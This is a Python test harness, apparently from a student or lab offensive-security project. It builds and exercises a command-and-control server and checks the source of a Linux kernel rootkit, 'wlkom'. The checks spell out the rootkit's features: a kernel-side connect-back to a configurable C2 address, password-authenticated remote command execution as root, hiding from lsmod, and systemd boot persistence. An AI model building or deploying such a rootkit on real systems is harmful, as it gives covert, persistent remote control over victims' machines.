#!/usr/bin/env python3
import socket
import subprocess
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
C2_DIR = ROOT / "attacking_program"
C2_BIN = C2_DIR / "c2"
WLKOM_C = ROOT / "rootkit" / "wlkom.c"
ROOTKIT_MAKEFILE = ROOT / "rootkit" / "Makefile"
PERSISTENCE_SCRIPT = ROOT / "rootkit" / "install_persistence.sh"


def ok(name):
    print(f"[OK] {name}")


def fail(name, message):
    print(f"[FAIL] {name}: {message}")
    raise AssertionError(message)


def run(cmd, **kwargs):
    return subprocess.run(cmd, text=True, capture_output=True, **kwargs)


def free_port():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def wait_for_line(proc, needle, timeout=3.0):
    deadline = time.time() + timeout
    lines = []
    while time.time() < deadline:
        line = proc.stdout.readline()
        if line:
            lines.append(line.rstrip())
            if needle in line:
                return lines
        elif proc.poll() is not None:
            break
        else:
            time.sleep(0.05)
    raise AssertionError(f"did not see {needle!r}; output so far: {lines!r}")


def test_c2_builds():
    """Compile le C2 avec make et vérifie que le binaire attacking_program/c2 est produit."""
    result = run(["make", "-C", str(C2_DIR)])
    if result.returncode != 0:
        fail("c2 builds", result.stderr or result.stdout)
    if not C2_BIN.exists():
        fail("c2 builds", "attacking_program/c2 was not produced")
    ok("c2 builds")


def test_c2_requires_port():
    """Vérifie que le C2 refuse de démarrer sans l'argument <port>."""
    result = run([str(C2_BIN)])
    if result.returncode == 0:
        fail("c2 rejects missing args", "c2 succeeded without <port>")
    if "Usage:" not in result.stderr:
        fail("c2 rejects missing args", f"unexpected stderr: {result.stderr!r}")
    ok("c2 rejects missing args")


def fnv1a_hash(text):
    value = 2166136261
    for byte in text.encode():
        value ^= byte
        value = (value * 16777619) & 0xffffffff
    return f"{value:08x}"


def test_c2_sends_auth_hash():
    """Lance le C2, se connecte en TCP et vérifie que la première trame reçue est AUTH <hash_fnv1a>."""
    port = free_port()
    password = "secret-test"
    proc = subprocess.Popen(
        [str(C2_BIN), str(port)],
        text=True,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    try:
        wait_for_line(proc, "C2 listening", timeout=3.0)
        with socket.create_connection(("127.0.0.1", port), timeout=3.0) as sock:
            proc.stdin.write(f"{password}\n")
            proc.stdin.flush()
            data = sock.recv(128)
        expected = f"AUTH {fnv1a_hash(password)}\n".encode()
        if data != expected:
            fail("c2 sends AUTH hash", f"expected {expected!r}, got {data!r}")
        ok("c2 sends AUTH hash")
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=2.0)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=2.0)


def require_source(pattern, description, source, test_name):
    if pattern not in source:
        fail(test_name, f"missing {description}: {pattern!r}")


def test_rootkit_makefile_compile_feature():
    """Vérifie que rootkit/Makefile déclare wlkom.o comme LKM et délègue au build system kernel."""
    source = ROOTKIT_MAKEFILE.read_text()
    checks = [
        ("KERNELDIR = /lib/modules/$(shell uname -r)/build", "kernel headers build directory"),
        ("obj-m = wlkom.o", "wlkom object declared as a loadable kernel module"),
        ("modules:", "modules target"),
        ("$(MAKE) -C $(KERNELDIR) M=$(PWD) $@", "delegation to the kernel build system"),
        ("clean:", "clean target"),
    ]
    for pattern, description in checks:
        require_source(pattern, description, source, "rootkit compile feature source checks")
    ok("rootkit compile feature source checks")


def test_wlkom_connection_source():
    """Vérifie dans wlkom.c la présence du kthread, du socket TCP kernel, du retry interruptible et du shutdown propre."""
    source = WLKOM_C.read_text()
    checks = [
        ("static char *c2_ip", "configurable C2 IP module parameter"),
        ("static int   c2_port", "configurable C2 port module parameter"),
        ("module_param(c2_ip", "C2 IP module parameter registration"),
        ("module_param(c2_port", "C2 port module parameter registration"),
        ("kthread_run(connection_thread", "background connection kthread"),
        ("while (!kthread_should_stop())", "stoppable retry/receive loops"),
        ("in4_pton(c2_ip", "IPv4 parsing"),
        ("sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP", "kernel TCP socket creation"),
        ("conn_sock->ops->connect", "kernel-side TCP connect"),
        ("kernel_recvmsg", "receive loop that detects disconnects"),
        ("schedule_timeout_interruptible(HZ * RETRY_DELAY)", "interruptible retry delay"),
        ("kernel_sock_shutdown(conn_sock, SHUT_RDWR)", "shutdown to unblock recv on rmmod/disconnect"),
        ("sock_release(conn_sock)", "socket release after disconnect"),
    ]
    for pattern, description in checks:
        require_source(pattern, description, source, "wlkom connection feature source checks")
    ok("wlkom connection feature source checks")


def test_persistence_installer_source():
    """Vérifie dans install_persistence.sh la présence du service systemd, de modprobe et du hash calculé en interactif."""
    source = PERSISTENCE_SCRIPT.read_text()
    checks = [
        ("Usage: sudo $0 [c2_ip] [c2_port]", "documented installer arguments"),
        ("/lib/modules/$KERNEL_VERSION/extra", "kernel-version-specific module install path"),
        ("install -m 0644", "module copy with stable permissions"),
        ("depmod -a", "module dependency index refresh"),
        ("/etc/modprobe.d/wlkom.conf", "modprobe configuration path"),
        ("options wlkom password_hash=$PASSWORD_HASH c2_ip=$C2_IP c2_port=$C2_PORT", "module parameters persisted"),
        ("WLKOM password:", "interactive password prompt"),
        ('PASSWORD_HASH="$(PASSWORD="$PASSWORD" python3', "installer computes hash internally"),
        ("/etc/systemd/system/wlkom.service", "systemd service path"),
        ("After=network-online.target", "service waits for network"),
        ("ExecStart=/sbin/modprobe wlkom", "module loaded through modprobe"),
        ("ExecStop=/sbin/modprobe -r wlkom", "module unload command"),
        ("systemctl enable wlkom.service", "service enabled at boot"),
    ]
    for pattern, description in checks:
        require_source(pattern, description, source, "persistence installer source checks")
    ok("persistence installer source checks")


def test_c2_fnv1a_source():
    """Vérifie dans c2.c que le hash FNV-1a est correctement implémenté (offset, prime, xor, multiply)."""
    source = (C2_DIR / "c2.c").read_text()
    checks = [
        ("#define FNV1A_OFFSET 2166136261U", "FNV-1a offset basis"),
        ("#define FNV1A_PRIME  16777619U", "FNV-1a prime"),
        ("static uint32_t fnv1a_hash", "FNV-1a hash helper"),
        ("hash ^= (unsigned char)*str", "FNV-1a xor step"),
        ("hash *= FNV1A_PRIME", "FNV-1a multiply step"),
        ("AUTH %08x\\n", "AUTH frame sends fixed-width hex hash"),
        ("strcmp(auth_reply, \"AUTH_OK\")", "C2 waits for the module authentication acknowledgement"),
    ]
    for pattern, description in checks:
        require_source(pattern, description, source, "c2 FNV-1a source checks")
    ok("c2 FNV-1a source checks")


def test_wlkom_password_auth_source():
    """Vérifie dans wlkom.c que le hash est un module_param non hardcodé et que l'authentification AUTH est correcte."""
    source = WLKOM_C.read_text()
    checks = [
        ('module_param(password_hash, charp, 0400);', "non-hardcoded password hash module parameter"),
        ("password_hash[0] == '\\0'", "empty-password-hash rejection"),
        ('#define AUTH_PREFIX "AUTH "', "AUTH protocol prefix"),
        ('recv_line(buf, sizeof(buf))', "line-based auth receive"),
        ('strncmp(buf, AUTH_PREFIX, AUTH_PREFIX_LEN)', "AUTH prefix validation"),
        ('strcmp(received_hash, password_hash)', "password hash comparison"),
        ('send_reply("AUTH_OK\\n")', "successful authentication acknowledgement"),
        ('return -EACCES;', "auth failure error"),
        ('authenticate_c2();', "auth called after connection"),
    ]
    for pattern, description in checks:
        require_source(pattern, description, source, "wlkom password/auth source checks")
    ok("wlkom password/auth source checks")


def test_wlkom_exec_source():
    """Vérifie dans wlkom.c la présence de call_usermodehelper, des fichiers tmp et des marqueurs du protocole de réponse."""
    source = WLKOM_C.read_text()
    checks = [
        ("execute_and_send_output", "command execution helper"),
        ("call_usermodehelper", "kernel usermode command execution"),
        ("UMH_WAIT_PROC", "synchronous wait for child process"),
        ("#define TMP_OUT_FILE", "stdout capture temp file macro"),
        ("#define TMP_ERR_FILE", "stderr capture temp file macro"),
        ("filp_open", "kernel file open to read output"),
        ("kernel_read", "kernel file read to stream output"),
        ("[Exit Status: %d]", "exit status line in response"),
        ("--- STDOUT ---", "stdout section delimiter"),
        ("--- STDERR ---", "stderr section delimiter"),
        ("--- End of Output ---", "end-of-output sentinel"),
    ]
    for pattern, description in checks:
        require_source(pattern, description, source, "wlkom exec feature source checks")
    ok("wlkom exec feature source checks")


def test_wlkom_hide_module_source():
    """Vérifie que wlkom peut se retirer de la liste des modules et s'y réinsérer."""
    source = WLKOM_C.read_text()
    checks = [
        ("static struct list_head   *module_prev", "previous module list entry storage"),
        ("static bool                module_hidden", "module hidden state flag"),
        ("hide_module_from_lsmod", "module hide helper"),
        ("list_del(&THIS_MODULE->list)", "module removed from the global module list"),
        ("show_module_in_lsmod", "module unhide helper"),
        ("list_add(&THIS_MODULE->list, module_prev)", "module reinserted into the global module list"),
        ('strcmp(cmd, "hide_module")', "C2 command to hide module"),
        ('strcmp(cmd, "unhide_module")', "C2 command to unhide module"),
        ('strcmp(cmd, "module_status")', "C2 command to report module visibility"),
        ("show_module_in_lsmod();", "module restored during exit"),
    ]
    for pattern, description in checks:
        require_source(pattern, description, source, "wlkom hide module source checks")
    ok("wlkom hide module source checks")


def test_c2_does_not_open_shell_on_auth_rejection():
    """Verifie que le prompt interactif reste masque si le client ne confirme pas AUTH."""
    port = free_port()
    proc = subprocess.Popen(
        [str(C2_BIN), str(port)],
        text=True,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    try:
        wait_for_line(proc, "C2 listening", timeout=3.0)
        with socket.create_connection(("127.0.0.1", port), timeout=3.0) as sock:
            proc.stdin.write("reject-test\n")
            proc.stdin.flush()
            sock.recv(128)
            sock.sendall(b"AUTH_FAIL\n")
        lines = wait_for_line(proc, "Authentication failed", timeout=3.0)
        if any("WLKOM INTERACTIVE SHELL" in line for line in lines):
            fail("c2 hides shell after failed auth", f"unexpected shell output: {lines!r}")
        ok("c2 hides shell after failed auth")
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=2.0)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=2.0)


def test_c2_detects_idle_disconnect():
    """Verifie que le C2 detecte une deconnexion rootkit meme sans nouvelle commande operateur."""
    port = free_port()
    password = "idle-disconnect"
    expected_auth = f"AUTH {fnv1a_hash(password)}\n".encode()

    proc = subprocess.Popen(
        [str(C2_BIN), str(port)],
        text=True,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    try:
        wait_for_line(proc, "C2 listening", timeout=3.0)
        with socket.create_connection(("127.0.0.1", port), timeout=3.0) as sock:
            sock.settimeout(3.0)
            proc.stdin.write(f"{password}\n")
            proc.stdin.flush()

            auth_data = b""
            while b"\n" not in auth_data:
                auth_data += sock.recv(64)
            if auth_data != expected_auth:
                fail("c2 detects idle disconnect", f"unexpected AUTH: {auth_data!r}")

            sock.sendall(b"AUTH_OK\n")
            wait_for_line(proc, "Authentication accepted", timeout=3.0)

        wait_for_line(proc, "Connection lost or rootkit disconnected", timeout=3.0)
        wait_for_line(proc, "Waiting for rootkit connection", timeout=3.0)
        ok("c2 detects idle disconnect")
    finally:
        proc.stdin.close()
        proc.terminate()
        try:
            proc.wait(timeout=2.0)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=2.0)


def test_c2_exec_protocol():
    """Lance le C2, simule le rootkit côté socket et vérifie que le C2 relaie la commande et accepte le format de réponse."""
    port = free_port()
    password = "test-exec"
    expected_auth = f"AUTH {fnv1a_hash(password)}\n".encode()

    proc = subprocess.Popen(
        [str(C2_BIN), str(port)],
        text=True,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    try:
        wait_for_line(proc, "C2 listening", timeout=3.0)

        with socket.create_connection(("127.0.0.1", port), timeout=3.0) as sock:
            sock.settimeout(3.0)

            proc.stdin.write(f"{password}\n")
            proc.stdin.flush()

            auth_data = b""
            while b"\n" not in auth_data:
                auth_data += sock.recv(64)
            if auth_data != expected_auth:
                fail("c2 exec protocol", f"unexpected AUTH: {auth_data!r}")

            sock.sendall(b"AUTH_OK\n")
            wait_for_line(proc, "Authentication accepted", timeout=3.0)
            time.sleep(0.2)

            proc.stdin.write("id\n")
            proc.stdin.flush()

            cmd_data = b""
            while b"\n" not in cmd_data:
                cmd_data += sock.recv(64)
            if cmd_data.strip() != b"id":
                fail("c2 exec protocol", f"wrong command received: {cmd_data!r}")

            response = (
                "[Exit Status: 0]\n"
                "--- STDOUT ---\n"
                "uid=0(root)\n"
                "--- STDERR ---\n"
                "--- End of Output ---\n\n"
            )
            sock.sendall(response.encode())

            time.sleep(0.2)
            proc.stdin.write("exit\n")
            proc.stdin.flush()

        ok("c2 exec protocol")
    finally:
        proc.stdin.close()
        proc.terminate()
        try:
            proc.wait(timeout=2.0)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=2.0)


def cleanup():
    run(["make", "-C", str(C2_DIR), "clean"])


def main():
    tests = [
        test_c2_builds,
        test_rootkit_makefile_compile_feature,
        test_wlkom_connection_source,
        test_persistence_installer_source,
        test_c2_requires_port,
        test_c2_fnv1a_source,
        test_c2_sends_auth_hash,
        test_wlkom_password_auth_source,
        test_wlkom_exec_source,
        test_wlkom_hide_module_source,
        test_c2_does_not_open_shell_on_auth_rejection,
        test_c2_detects_idle_disconnect,
        test_c2_exec_protocol,
    ]
    try:
        for test in tests:
            test()
        print(f"[OK] {len(tests)} tests passed")
    finally:
        cleanup()


if __name__ == "__main__":
    try:
        main()
    except AssertionError:
        sys.exit(1)
